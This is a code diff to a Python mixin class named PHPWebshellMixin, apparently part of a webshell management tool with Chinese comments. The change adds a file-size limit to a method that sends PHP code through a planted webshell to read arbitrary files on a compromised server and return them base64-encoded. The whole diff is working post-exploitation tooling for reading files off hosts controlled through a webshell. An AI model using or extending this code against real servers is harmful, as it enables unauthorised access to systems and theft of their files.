@@ -101,7 +101,10 @@ class PHPWebshellMixin:
             )
         return result
 
-    async def get_file_contents(self, filepath: str) -> bytes:
+    async def get_file_contents(
+        self, filepath: str, max_size: int = 1024 * 200
+    ) -> bytes:
+        """获取文件的内容，内容是base64编码的字节序列，不是已经解码的字符串"""
         php_code = """
         error_reporting(0);
         $filePath = FILE_PATH;
@@ -111,16 +114,23 @@ class PHPWebshellMixin:
         if(!is_readable($filePath)) {
             die("WRONG_NO_PERMISSION");
         }
+        if(filesize($filePath) > MAX_SIZE) {
+            die("WRONG_FILE_TOO_LARGE");
+        }
         $content = file_get_contents($filePath);
         echo base64_encode($content);
         """.replace(
             "FILE_PATH", repr(filepath)
+        ).replace(
+            "MAX_SIZE", str(max_size)
         )
         result = await self.submit(php_code)
         if result == "WRONG_NOT_FILE":
             raise FileError("目标不是一个文件")
         if result == "WRONG_NO_PERMISSION":
             raise FileError("没有权限读取这个文件")
+        if result == "WRONG_FILE_TOO_LARGE":
+            raise FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
         return base64.b64decode(result)
 
     async def get_pwd(self) -> str:
